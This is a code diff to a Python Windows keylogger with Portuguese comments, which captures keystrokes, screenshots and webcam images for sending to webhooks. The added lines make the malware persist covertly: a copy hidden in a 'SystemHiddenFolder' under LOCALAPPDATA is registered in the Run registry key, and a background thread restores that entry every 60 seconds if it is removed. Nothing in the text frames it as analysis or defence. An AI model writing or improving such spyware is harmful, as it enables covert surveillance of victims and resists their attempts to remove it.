@@ -13,10 +13,10 @@ import keyboard
 import cv2
 import io
 import shutil
+from threading import Thread
 from PIL import Image
 
 # ------------------- CONFIGURAÇÕES DE WEBHOOK -------------------
-
 webhook_keys_url = ""  # URL WEBHOOK 
 webhook_media_url = ""  # URL WEBHOOK  
 
@@ -28,14 +28,15 @@ captured_keys = []
 start_time = time.time()
 
 # ------------------- FUNÇÕES DE INICIALIZAÇÃO -------------------
-def add_startup():
+def add_startup(file_path=None):
     try:
-        fp = os.path.dirname(os.path.realpath(__file__))
-        file_name = sys.argv[0].split('\\')[-1]
-        new_file_path = fp + '\\' + file_name
+        if file_path is None:
+            fp = os.path.dirname(os.path.realpath(__file__))
+            file_name = sys.argv[0].split('\\')[-1]
+            file_path = fp + '\\' + file_name
         key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
         key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_val, 0, winreg.KEY_ALL_ACCESS)
-        winreg.SetValueEx(key2change, 'Im_not_a_keylogger', 0, winreg.REG_SZ, new_file_path)
+        winreg.SetValueEx(key2change, 'Im_not_a_keylogger', 0, winreg.REG_SZ, file_path)
     except Exception as e:
         print(f"Erro ao adicionar ao startup: {e}")
 
@@ -57,8 +58,33 @@ def copy_to_hidden_folder():
         os.system(f'attrib +h "{new_file_path}"')
 
         print(f'Arquivo copiado e oculto em: {new_file_path}')
+
+        # Adiciona a cópia ao startup
+        add_startup(new_file_path)
     except Exception as e:
         print(f"Erro ao copiar o arquivo para a pasta oculta: {e}")
+
+def verify_startup():
+    while True:
+        try:
+            key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
+            key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_val, 0, winreg.KEY_ALL_ACCESS)
+            value, regtype = winreg.QueryValueEx(key2change, 'Im_not_a_keylogger')
+
+            # Se o valor não corresponder ao caminho esperado, restaura
+            destination_dir = os.path.join(os.getenv('LOCALAPPDATA'), 'SystemHiddenFolder')
+            expected_path = os.path.join(destination_dir, os.path.basename(sys.argv[0]))
+            if value != expected_path:
+                add_startup(expected_path)
+        except FileNotFoundError:
+            # Caso a entrada não exista, recria-a
+            destination_dir = os.path.join(os.getenv('LOCALAPPDATA'), 'SystemHiddenFolder')
+            expected_path = os.path.join(destination_dir, os.path.basename(sys.argv[0]))
+            add_startup(expected_path)
+        except Exception as e:
+            print(f"Erro ao verificar o registro do startup: {e}")
+
+        time.sleep(60)  # Verifica a cada 60 segundos
 
 # ------------------- FUNÇÕES DE CAPTURA DE TELA E CÂMERA -------------------
 def screenshot():
@@ -156,6 +182,9 @@ def main():
     add_startup()
     hide()
     copy_to_hidden_folder()
+
+    # Inicia a verificação de persistência em uma thread separada
+    Thread(target=verify_startup, daemon=True).start()
 
     global start_time, last_screenshot_time
     start_time = time.time()
